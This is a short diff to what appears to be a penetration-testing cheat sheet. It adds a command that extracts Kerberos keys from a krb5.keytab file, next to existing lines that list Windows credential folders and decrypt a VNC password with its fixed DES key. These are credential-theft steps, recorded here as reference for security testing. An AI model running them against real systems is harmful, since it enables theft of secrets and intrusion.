@@ -180,6 +180,11 @@ dir C:\Users\$USER\AppData\Local\Microsoft\Credentials\
 # Assume the string from the .vnc file is d7a514d8c556aade
 
 echo -n d7a514d8c556aade | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
+```
+
+```bash
+# Keytab extract - krb5.keytab 
+python3 keytabextract.py krb5.keytab
 
 ```
 
